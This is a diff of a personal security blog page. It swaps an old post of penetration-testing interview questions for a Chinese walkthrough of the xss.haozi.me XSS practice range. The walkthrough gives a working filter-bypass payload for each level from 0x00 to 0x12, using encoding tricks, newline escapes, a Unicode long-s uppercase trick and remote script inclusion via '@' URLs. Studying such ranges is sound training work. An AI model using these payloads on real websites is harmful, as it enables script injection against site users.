@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Sunian&#39;s Blog</title>
-  <meta name="keywords" content>
-  <meta name="description" content="Sunian&#39;s Blog">
+  <title>&#39;XSS靶场通关&#39; | Sunian&#39;s Blog</title>
+  <meta name="keywords" content=" XSS ">
+  <meta name="description" content="&#39;XSS靶场通关&#39; | Sunian&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简历素念，男，19岁 现读于某大专院校，汽修专业，自学web安全 专注于研究渗透测试方向 web安全，内网，硬件，社工等 联系方式QQ：3504078815 邮箱：lingyu195@gmail.com">
 <meta property="og:type" content="website">
@@ -52,7 +52,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/imgss/touxiang.jpg" />
@@ -681,12 +681,55 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-XSS靶场通关" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#记一次360笔试题"><span class="toc-text">记一次360笔试题</span></a></li></ol>
+        <h1 class="article-title">&#39;XSS靶场通关&#39;</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a href="javascript:" data-rel="XSS">XSS</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color4">XSS</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-12-10 10:40:14'>2019-12-10 09:54</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#所使用靶场"><span class="toc-text">所使用靶场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00"><span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02"><span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03"><span class="toc-text">0x03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04"><span class="toc-text">0x04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05"><span class="toc-text">0x05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06"><span class="toc-text">0x06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07"><span class="toc-text">0x07</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08"><span class="toc-text">0x08</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09"><span class="toc-text">0x09</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0A"><span class="toc-text">0x0A</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0B"><span class="toc-text">0x0B</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0C"><span class="toc-text">0x0C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0D"><span class="toc-text">0x0D</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0E"><span class="toc-text">0x0E</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0F"><span class="toc-text">0x0F</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10"><span class="toc-text">0x10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11"><span class="toc-text">0x11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12"><span class="toc-text">0x12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -699,33 +742,118 @@
     }
 </style>
 </div>
-            <h3 id="记一次360笔试题"><a href="#记一次360笔试题" class="headerlink" title="记一次360笔试题"></a>记一次360笔试题</h3><ol>
-<li><p>如果存在SQL注入怎么判断不同的数据库。</p>
-</li>
-<li><p>简述下浏览器的自解码机制。</p>
-</li>
-<li><p>拿到目标站怎么进行渗透，需要注意什么。</p>
-</li>
-<li><p>CSRF漏洞的原理是什么？怎么修复？</p>
-</li>
-<li><p>代码审计怎么做？</p>
-</li>
-<li><p>哪些漏洞是WAF不能防御的？请举出至少三类漏洞。</p>
-</li>
-<li><p>考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete.php?article_id=24，请考虑这个地方最有可能出现哪些安全问题？</p>
-</li>
-<li><p>PHP5环境下，如果配置文件中magic_quotes_gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？</p>
-</li>
-<li><p>使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。</p>
-</li>
-<li><p>渗透时后端环境是apache+php+mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1.mysql用户需要有（）权限；2.需要知道（）路径；3.（）（符号）不能被过滤。</p>
-</li>
-</ol>
-<p>欢迎加入知识星球，获取参考答案及更多渗透资料<br><img src="/imgss/tu52.png" alt=""></p>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="所使用靶场"><a href="#所使用靶场" class="headerlink" title="所使用靶场"></a>所使用靶场</h3><p><img src="/imgss/t57.png" alt><br>为了避免错误，建议谷歌打开部署靶场<a href="https://xss.haozi.me/#/0x00" target="_blank" rel="noopener">https://xss.haozi.me/#/0x00</a></p>
+<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>这关没啥好说的<br>直接hackbar生成一个payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-        </article>
-        
-        
+<p><img src="/imgss/t58.png" alt></p>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这关闭合一下前面的textarea标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t59.png" alt></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>闭合标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t60.png" alt></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>这关过滤了小括号，所以我们用反引号代替</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t61.png" alt></p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>过滤了小括号和反引号，我们还可以用编码绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert&amp;#40;1&amp;#41;&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=javascript:alert&amp;#x28;1&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t62.png" alt></p>
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>这关如果用- - &gt;闭合会变成一个哭笑不得的表情，所以想办法闭合前面的注释就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert&amp;#40;1&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t63.png" alt></p>
+<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>这关对auto/on开头=结尾的字符及&gt;进行转换为_下划线。我们用换行进行逃逸就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type=&quot;image&quot; src=&quot;xxx&quot; onerror</span><br><span class="line"></span><br><span class="line">=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t64.png" alt></p>
+<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>匹配了尖括号&lt;&gt;开头结尾的字符串替换为空，利用浏览器的兼容性，可以通过少输入一个&gt;来绕过正则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t65.png" alt></p>
+<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>这关把”&lt;\style&gt;”替换为/*坏人*/，但我们可以通过右括号&gt;换行进行逃逸</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(1);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t66.png" alt></p>
+<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>这关没有做任何过滤，但要包含指定网址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以闭合src参数，写onload事件</span><br><span class="line">https://www.segmentfault.com&quot; onload=alert(1)&gt;</span><br><span class="line">也可以先闭合script标签，然后注释掉后面</span><br><span class="line">https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t67.png" alt></p>
+<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><p>这里用到一个知识点@，如果你访问的是 <a href="http://www.baidu.com@www.google.com，" target="_blank" rel="noopener">www.baidu.com@www.google.com，</a> 那么你最后进入的是谷歌的页面<br>还是需要包含指定网址，过滤了关键字替换为html实体编码，所以我们包含作者的js，js中是alert(1)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.haozi.me/j.js</span><br><span class="line">https://xssye.com/iCfv</span><br></pre></td></tr></table></figure>
+
+<p>在xss注入中属于引入漏洞页面<br>理论上来说应该是可以的，但是XSS平台上的代码状态为blocked:origin，无法导入脚本，应该是浏览器的安全策略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com.haozi.me/j.js</span><br></pre></td></tr></table></figure>
+
+<p>最后使用以上url过的，加载了内容为alert(1)的js代码，可见就是浏览器安全策略的问题<br><img src="/imgss/t68.png" alt></p>
+<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><p>这关把所有输入变成大写，注意 html 不严格区分大小写，js严格区分大小写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t69.png" alt></p>
+<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><p>和上一关一样，不过对script标签添加了过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t70.png" alt></p>
+<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><p>过滤了&lt;/“‘符号，<br>先用换行绕过//注释，再用- -&gt;忽略后面的引号和括号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert(1);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t71.png" alt></p>
+<h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><p>这关匹配了&lt;与字母的组合a-zA-Z，就是说&lt; s无法使用，所以我们用古英语ſ 在进行toUpperCase全大写过滤时，把ſ 替换成S。<br>这个字母怎么打出来，要么复制我的，要么看链接<a href="https://unicode-table.com/cn/017F/" target="_blank" rel="noopener">https://unicode-table.com/cn/017F/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;&lt;/ſcript&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t72.png" alt></p>
+<h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><p>闭合console.error，再添加alert,然后注释掉后面的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;);alert(1)//</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t73.png" alt></p>
+<h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>这关只要闭合data赋值就行,换行或者分号都可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;alert(1)</span><br><span class="line">&quot;&quot;;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t74.png" alt></p>
+<h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><p>这关只要闭合就好了，可以用(“也可以用//注释掉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;);alert(1);//</span><br><span class="line">&quot;);alert(1);(&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t75.png" alt></p>
+<h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><p>这关会把”双引号转译成/“，所以我们反斜线再次转义即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\&quot;);alert(1);&lt;/script&gt;</span><br><span class="line">\&quot;);alert(1);//</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgss/t76.png" alt></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1，html中，符号可相互替换，如单双引号，反引号，括号等<br>2，注释符，单行//，多行&lt;！- - xxxx - - &gt;和&lt;!- xxxx -!&gt;<br>3，换行可以绕过正则，因为正则只读取一行字符串检测<br>4，浏览器的兼容性可以让缺少的标签或参数仍然运行，如&gt;右尖括号<br>5，url中的@符可以让登陆网址为@后所指的网址<br>6，html不区分大小写，而JS区分大小写<br>7，特殊符号可以绕过大小写检测，如古英语ſ经过toUpperCase大写函数会变成S</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在QQ私聊我，也可以邮件至 lingyu195@gmail.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>&#39;XSS靶场通关&#39;</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="素念">素念</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-12-10, 09:54:41</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-10, 10:40:14</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/12/10/XSS靶场通关/" title="&#39;XSS靶场通关&#39;">http://yoursite.com/2019/12/10/XSS靶场通关/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">©2016-2019 sunian</p>
